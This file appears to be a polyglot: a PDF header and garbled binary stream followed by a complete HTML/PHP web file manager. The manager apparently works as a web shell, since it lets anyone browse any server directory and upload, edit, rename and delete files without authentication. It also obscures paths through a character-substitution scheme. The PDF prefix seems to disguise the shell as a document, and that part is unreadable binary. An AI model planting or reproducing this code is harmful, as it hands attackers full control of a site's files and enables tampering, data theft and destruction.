%PDF-1.3
%&#195;&#162;&#195;&#163;&#195;&#143;&#195;;
1 0 obj<</Type/Catalog/PageMode/UseOutlines/Pages 3 0 R>>
endobj
2 0 obj<</CreationDate(D:20181024165239+07'00')/Producer(PoDoFo - http://podofo.sf.net)>>
endobj
3 0 obj<</Type/Pages/Count 163/Kids[ 24780 1 R 24785 0 R 24788 0 R 24791 0 R 24794 0 R 24797 0 R 24800 0 R 24803 0 R 24806 0 R 24809 0 R 24812 0 R 24815 0 R 24818 0 R 24821 0 R 24824 0 R 24827 0 R 24830 0 R 24833 0 R 24836 0 R 24839 0 R 24842 0 R 24845 0 R 24848 0 R 24851 0 R 24854 0 R 24857 0 R 24860 0 R 24863 0 R 24866 0 R 24869 0 R 24872 0 R 24875 0 R 24878 0 R 24881 0 R 24884 0 R 24887 0 R 24890 0 R 24893 0 R 24896 0 R 24899 0 R 24902 0 R 24905 0 R 24908 0 R 24911 0 R 24914 0 R 24917 0 R 24920 0 R 24923 0 R 24926 0 R 24929 0 R 24932 0 R 24935 0 R 24938 0 R 24941 0 R 24944 0 R 24947 0 R 24950 0 R 24953 0 R 24956 0 R 24959 0 R 24962 0 R 24965 0 R 24968 0 R 24971 0 R 24974 0 R 24977 0 R 24980 0 R 24983 0 R 24986 0 R 24989 0 R 24992 0 R 24995 0 R 24998 0 R 25001 0 R 25004 0 R 25007 0 R 25010 0 R 25013 0 R 25016 0 R 25019 0 R 25022 0 R 25025 0 R 25028 0 R 25031 0 R 25034 0 R 25037 0 R 25040 0 R 25043 0 R 25046 0 R 25049 0 R 25052 0 R 25055 0 R 25058 0 R 25061 0 R 25064 0 R 25067 0 R 25070 0 R 25073 0 R 25076 0 R 25079 0 R 25082 0 R 25085 0 R 25088 0 R 25091 0 R 25094 0 R 25097 0 R 25100 0 R 25103 0 R 25106 0 R 25109 0 R 25112 0 R 25115 0 R 25118 0 R 25121 0 R 25124 0 R 25127 0 R 25130 0 R 25133 0 R 25136 0 R 25139 0 R 25142 0 R 25145 0 R 27580 1 R 27585 0 R 27588 0 R 27591 0 R 27594 0 R 27597 0 R 27600 0 R 27603 0 R 27606 0 R 27609 0 R 27612 0 R 27615 0 R 27618 0 R 27621 0 R 27624 0 R 27627 0 R 27630 0 R 27633 0 R 27636 0 R 27639 0 R 27642 0 R 27645 0 R 27648 0 R 27651 0 R 27654 0 R 27657 0 R 28569 1 R 28574 0 R 28577 0 R 28580 0 R 28583 0 R 28586 0 R 28589 0 R 28592 0 R 28595 0 R 28598 0 R 28601 0 R 28604 0 R 28626 0 R 28629 0 R 28632 0 R]>>
endobj
7 1 obj<</Type/XObject/BBox[ 0.000000 0.000000 609.600000 935.600000]/Filter/FlateDecode/FormType 1/Length 4548/Matrix[ 1 0 0 1 0 0]/Resources<</Font<</F1 131 0 R/F2 134 0 R/F3 137 0 R/F4 141 0 R/F5 145 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI]>>/Subtype/Form>>
stream
x&#194;&#339;&#194;&#165;\mo7&#195;&#190; &#195;&#191;a?&#195;&#174;&#195;&#162;&#195;£H&#194;&#163;&#195;&#195;&#338;&#195;&#160;&#194;&#352;yi{&#194;&#185;$E&#195;&#353;(i?&#194;&#172;c&#195;&#8225;&#195;&#382;&#195;&#8222;k&#195;&#187;&#195;&#188;rA&#195;&#190;&#195;&#189;&#194;Ñ&#194;&#189;&#194;&#144;&#194;&#381;v&#194;^E&#195;&#8250;&#195;&#173;zF&#194;&#162;HI|H&#194;&#195;§?&#194;&#191;{&#195;&#732;|Z|X|&#195;^&#195;&#157;&#195;£&#195;&#179;&#194;&#8225;&#194;&#8225;&#195;&#181;&#195;&#8225;&#195;&#8249;&#195;&#179;&#194;&#179;&#195;&#194;&#8225;&#195;&#163;77&#195;&#8250;?&#194;&#143;O&#194;&#190;&#195;&#157;&#194;&#382;&#194;&#191;__l&#194;&#174;&#195;&#194;&#8250;&#194;&#8250;&#195;&#171;&#195;&#163;&#195;&#376;O&#195;&#160;&#195;&#194;&#143;77&#195;+w&#195;&#376;&#194;&#191;x&#195;£&#195;&#170;&#195;&#165;&#195;&#162;&#195;&#195;Ñ&#195;;'&#195;&#8225;?&#194;&#170;&#195;&#194;^8&#195;&#185;&#195;&#180;&#195;&#180;I]
&#194;&#181;&#195;&#187;gQ&#194;&#187;&#195;§B&#194;&#169;&#194;&#166;2za&#195;&#160;&#194;&#179;]&#194;&#339;l&#195;&#157;&#195;&#187;&#195;|&#195;&#188;&#195;&#180;&#195;&#180;&#195;Ñ&#194;&#8225;&#195;&#165;&#195;&#8250;&#195;&#8226;&#194;&#376;&#194;&#8249;&#194;;?}&#195;&#178;&#194;&#402;&#194;&#163;
 " L* &      J *   j . 
     N    
             (8HXhx        )9IYiy           *:JZjz        
+;K[k{        
,<L\l|        -=M]m}        M > C> r.  ^  ~ N @ qO!    
`
 ( S   A
   &#238;a=  ! wQ   It Ba 

@l q T  
f
 !U*  A 9%n  o M - 
5J  w@O|l:Bg y= B=jq K - jM 4EP N q&#352;f     ^ u>£ $k^( &#157;H lÄEW
  o W   %l d]   6    ] - L    >  9 t* y 4&#191; b  5  Q\
 \&#214;v  U    2c   3  c qM&#203;=   |  IT:   S &#339;   |{;^| e]/ n3g   _ > t!  y   {  Zm   \{o]'S ~  VN a   w  -    u  x*  " &#213;3 }$jH q w bx  B" < 5b  }%&#352;+    09_h>G   u7$  y  MJ$ Y&X z   (r ` [N _pny!lu   o x  `N d   z Oy   O.* r  _s       iQ  BRx&#162;.)  _6jV ]  # W RVy k~   cI  Y   H      dsR   rZ+ )f&#172;d v*&#160;  ' i  U G  j * cB&#231;   zi  _   j  z[  7;   2    -  zZ      f  V &#174; z9   JR n      72   81 [e n &ci  (  r 
 U   q _+q rV 3  "  >   ;1  0x >{    |` r h W  q f  3¦  l&#231; ]u b-5 Fwm  z zp)M  ) jO q&#197;  u q  E  K   l 7   [[ y Xg     
  e  ~ , 9 &#221; k;   +ny   )s=9)  &#238; u_l  " Z   ; x   =.  
M=  +?  ^    q $ .[ i [   Fj   y    Ux { >_  xH  > ;   8    <   w/l hy   
   9o <: 'f4    |    w&#352;     e  G G  
* !#    b` B,    $*q Ll   (Jq T  r   ,jq \   0 q d, &#200; 4 q ll   8 q t    < q |   @
r  , !  D*r  l #   HJr    %/  Ljr   '?     P r  , ) Q;
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>

    <?php


    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("B", "‹", "Á", "_");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("B", "‹", "Á", "_");
        return str_replace($b, $a, $path);
    }


    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "_", $paths[$i]);
            if ($i != $id)
                echo "B";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');


    if (isset($_GET['p'])) {
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
        }
        echo "  </tbody>
</table>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>